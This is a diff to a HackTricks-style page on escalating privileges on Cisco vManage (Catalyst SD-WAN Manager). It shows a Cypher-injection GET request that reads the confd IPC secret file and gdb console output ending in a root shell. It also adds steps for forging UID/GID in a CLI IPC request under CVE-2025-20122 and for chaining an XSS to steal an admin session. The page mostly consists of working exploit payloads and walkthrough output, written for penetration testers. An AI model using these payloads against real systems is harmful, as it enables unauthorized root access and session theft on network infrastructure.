@@ -17,7 +17,7 @@ vmanage:~$ ls -al /etc/confd/confd_ipc_secret
 Remember our Neo4j instance? It is running under the `vmanage` user's privileges, thus allowing us to retrieve the file using the previous vulnerability:
 
 ```
-GET /dataservice/group/devices?groupId=test\\\'<>\"test\\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+' HTTP/1.1
+GET /dataservice/group/devices?groupId=test\\\'<>\"test\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+' HTTP/1.1
 
 Host: vmanage-XXXXXX.viptela.net
 
@@ -56,7 +56,10 @@ The blog¹ by the synacktiv team described an elegant way to get a root shell, b
 
 When I disassembled `/usr/bin/confd_cli` binary, I observed the following:
 
-```
+<details>
+<summary>Objdump showing UID/GID collection</summary>
+
+```asm
 vmanage:~$ objdump -d /usr/bin/confd_cli
 … snipped …
 40165c: 48 89 c3              mov    %rax,%rbx
@@ -84,6 +87,8 @@ vmanage:~$ objdump -d /usr/bin/confd_cli
 4016c4:   e8 d7 f7 ff ff           callq  400ea0 <*ABS*+0x32e9880f0b@plt>
 … snipped …
 ```
+
+</details>
 
 When I run “ps aux”, I observed the following (_note -g 100 -u 107_)
 
@@ -124,7 +129,10 @@ run
 
 Console Output:
 
-```
+<details>
+<summary>Console output</summary>
+
+```text
 vmanage:/tmp$ gdb -x root.gdb /usr/bin/confd_cli
 GNU gdb (GDB) 8.0.1
 Copyright (C) 2017 Free Software Foundation, Inc.
@@ -158,7 +166,25 @@ uid=0(root) gid=0(root) groups=0(root)
 bash-4.4#
 ```
 
+</details>
+
+## Path 3 (2025 CLI input validation bug)
+
+Cisco renamed vManage to *Catalyst SD-WAN Manager*, but the underlying CLI still runs on the same box. A 2025 advisory (CVE-2025-20122) describes insufficient input validation in the CLI that lets **any authenticated local user** gain root by sending a crafted request to the manager CLI service. Combine any low-priv foothold (e.g., the Neo4j deserialization from Path1, or a cron/backup user shell) with this flaw to jump to root without copying `confd_cli_user` or attaching GDB:
+
+1. Use your low-priv shell to locate the CLI IPC endpoint (typically the `cmdptywrapper` listener shown on port 4565 in Path2).
+2. Craft a CLI request that forges UID/GID fields to 0. The validation bug fails to enforce the original caller’s UID, so the wrapper launches a root-backed PTY.
+3. Pipe any command sequence (`vshell; id`) through the forged request to obtain a root shell.
+
+> The exploit surface is local-only; remote code execution is still required to land the initial shell, but once inside the box exploitation is a single IPC message rather than a debugger-based UID patch.
+
+## Other recent vManage/Catalyst SD-WAN Manager vulns to chain
+
+* **Authenticated UI XSS (CVE-2024-20475)** – Inject JavaScript in specific interface fields; stealing an admin session gives you a browser-driven path to `vshell` → local shell → Path3 for root.
+
+## References
+
+- [Cisco Catalyst SD-WAN Manager Privilege Escalation Vulnerability (CVE-2025-20122)](https://www.cisco.com/c/en/us/support/docs/csa/cisco-sa-sdwan-priviesc-WCk7bmmt.html)
+- [Cisco Catalyst SD-WAN Manager Cross-Site Scripting Vulnerability (CVE-2024-20475)](https://www.cisco.com/c/en/us/support/docs/csa/cisco-sa-sdwan-xss-zQ4KPvYd.html)
+
 {{#include ../../banners/hacktricks-training.md}}
-
-
-
